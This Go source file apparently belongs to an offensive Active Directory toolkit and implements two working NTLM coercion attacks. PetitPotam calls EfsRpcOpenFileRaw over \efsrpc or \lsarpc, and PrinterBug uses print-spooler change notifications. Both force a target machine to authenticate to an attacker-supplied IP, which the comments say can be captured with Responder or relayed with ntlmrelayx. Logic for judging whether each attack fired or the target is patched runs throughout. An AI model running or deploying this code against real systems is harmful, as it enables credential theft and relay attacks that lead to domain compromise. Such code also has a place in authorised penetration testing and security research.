package coerce

import (
	"fmt"
	"strings"

	efsr "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/c681d488-d850-11d0-8c52-00c04fd90f7e/1.0"
	efsrfunctions "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/c681d488-d850-11d0-8c52-00c04fd90f7e/1.0/functions"
	spoolss "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/12345678-1234-abcd-ef00-0123456789ab/1.0"
	spoolssfunctions "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/12345678-1234-abcd-ef00-0123456789ab/1.0/functions"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	dcerpcclient "github.com/TheManticoreProject/Manticore/network/dcerpc/v5/client"
	msrprn "github.com/TheManticoreProject/Manticore/windows/protocols/ms-rprn"

	gofenrirsmb "github.com/0xbbuddha/GoFenrir/protocols/smb"
)

// efsrPipes are the named pipes over which EFSR is reachable, in order of preference.
// \efsrpc is the dedicated pipe; \lsarpc is the original PetitPotam vector (patched
// separately on some systems). We try both so the check works even when \efsrpc is
// removed by KB5005413.
var efsrPipes = []string{`\efsrpc`, `\lsarpc`}

// CoerceResult describes whether coercion was triggered.
type CoerceResult struct {
	Triggered bool
	Pipe      string // which pipe succeeded
	Status    string // human-readable outcome
}

// PetitPotam triggers NTLM coercion from the target to attackerIP via MS-EFSR
// (EfsRpcOpenFileRaw / CVE-2021-36942). The target machine will attempt to authenticate
// to \\attackerIP\share, which can be captured with Responder or relayed with ntlmrelayx.
// Both \efsrpc and \lsarpc pipes are tried.
func PetitPotam(session *gofenrirsmb.Session, attackerIP string) (*CoerceResult, error) {
	if err := session.TreeConnect("IPC$"); err != nil {
		return nil, fmt.Errorf("IPC$: %w", err)
	}

	path := fmt.Sprintf(`\\%s\share\pwned`, attackerIP)

	var lastErr error
	for _, pipe := range efsrPipes {
		transport, err := session.Client.RPCTransport(pipe)
		if err != nil {
			lastErr = fmt.Errorf("open %s: %w", pipe, err)
			continue
		}

		rpc := dcerpcclient.NewClient(transport)
		if err := rpc.Bind(efsr.SyntaxID()); err != nil {
			rpc.Close()
			lastErr = fmt.Errorf("efsr bind on %s: %w", pipe, err)
			continue
		}

		_, callErr := efsrfunctions.EfsRpcOpenFileRaw(rpc, ndr.WSTR(path), 0)
		rpc.Close()

		if callErr == nil {
			return &CoerceResult{Triggered: true, Pipe: pipe, Status: "ERROR_SUCCESS"}, nil
		}

		errStr := callErr.Error()
		// A clean Win32 error (access denied, file not found, not supported) means
		// the server processed the call - the coercion was sent.
		if isCleanWin32Error(errStr) {
			return &CoerceResult{Triggered: true, Pipe: pipe, Status: errStr}, nil
		}

		// A DCE/RPC fault at opnum 0 means the server received the call but rejected it
		// (likely patched via KB5005413). This is not a transport error, so we stop here
		// and report "not vulnerable" rather than trying the next pipe.
		if strings.Contains(errStr, "DCE/RPC fault") || strings.Contains(errStr, "nca_s_fault") {
			return &CoerceResult{Triggered: false, Pipe: pipe, Status: "not vulnerable (patched): " + errStr}, nil
		}

		// Transport error (pipe not available, bind failed) - try next pipe.
		lastErr = fmt.Errorf("%s: %s", pipe, errStr)
	}

	if lastErr != nil {
		return &CoerceResult{Triggered: false, Status: lastErr.Error()}, lastErr
	}
	return &CoerceResult{Triggered: false, Status: "all pipes unavailable"}, fmt.Errorf("all EFSR pipes unavailable")
}

// PrinterBug triggers NTLM coercion from the target to attackerIP via MS-RPRN
// (the print spooler bug / SpoolSample). It opens a handle to the target's print
// server, then asks it to deliver change notifications to \\attackerIP, which makes
// the spooler authenticate back there (capture with Responder or relay with
// ntlmrelayx). Requires the Print Spooler service to be running on the target.
func PrinterBug(session *gofenrirsmb.Session, attackerIP string) (*CoerceResult, error) {
	if err := session.TreeConnect("IPC$"); err != nil {
		return nil, fmt.Errorf("IPC$: %w", err)
	}

	transport, err := session.Client.RPCTransport(spoolss.PipeName)
	if err != nil {
		return nil, fmt.Errorf("open %s: %w", spoolss.PipeName, err)
	}
	rpc := dcerpcclient.NewClient(transport)
	if err := rpc.Bind(spoolss.SyntaxID()); err != nil {
		rpc.Close()
		return nil, fmt.Errorf("spoolss bind: %w", err)
	}
	defer rpc.Close()

	// Open the target's print server. MAXIMUM_ALLOWED asks for whatever access the
	// account is granted, so the open succeeds regardless of privilege level.
	const maximumAllowed = ndr.DWORD(0x02000000)
	printerName := ndr.WSTR(`\\` + session.Host)
	handle, err := spoolssfunctions.RpcOpenPrinter(rpc, &printerName, nil, msrprn.DEVMODE_CONTAINER{}, maximumAllowed)
	if err != nil {
		return &CoerceResult{Pipe: spoolss.PipeName, Status: "RpcOpenPrinter failed (spooler down?): " + err.Error()}, err
	}

	// Subscribe the attacker as the notification target -> the spooler connects back.
	const printerChangeAddJob = ndr.DWORD(0x00000100)
	localMachine := ndr.WSTR(`\\` + attackerIP)
	callErr := spoolssfunctions.RpcRemoteFindFirstPrinterChangeNotificationEx(rpc, handle, printerChangeAddJob, 0, &localMachine, 0, nil)

	if callErr == nil {
		return &CoerceResult{Triggered: true, Pipe: spoolss.PipeName, Status: "ERROR_SUCCESS"}, nil
	}
	// The spooler attempts the callback during the call, so a clean Win32 status
	// (incl. RPC_S_SERVER_UNAVAILABLE 0x6ba when it cannot reach the attacker back-
	// channel) still means the coercion fired.
	errStr := callErr.Error()
	if isCleanWin32Error(errStr) || strings.Contains(errStr, "0x000006ba") || strings.Contains(errStr, "RPC_S_SERVER_UNAVAILABLE") {
		return &CoerceResult{Triggered: true, Pipe: spoolss.PipeName, Status: errStr}, nil
	}
	if strings.Contains(errStr, "DCE/RPC fault") || strings.Contains(errStr, "nca_s_fault") {
		return &CoerceResult{Pipe: spoolss.PipeName, Status: "not vulnerable / spooler disabled: " + errStr}, nil
	}
	return &CoerceResult{Pipe: spoolss.PipeName, Status: errStr}, callErr
}

// isCleanWin32Error returns true when the error is a Win32 status code from the
// server (meaning the call was processed and coercion was sent), as opposed to a
// transport/NDR failure before the call reached the server.
func isCleanWin32Error(errStr string) bool {
	for _, marker := range []string{
		"ERROR_ACCESS_DENIED", "ERROR_FILE_NOT_FOUND",
		"ERROR_NOT_SUPPORTED", "ERROR_INVALID_PARAMETER",
		"0x00000005", "0x00000002", "0x00000032", "0x00000057",
	} {
		if strings.Contains(errStr, marker) {
			return true
		}
	}
	return false
}
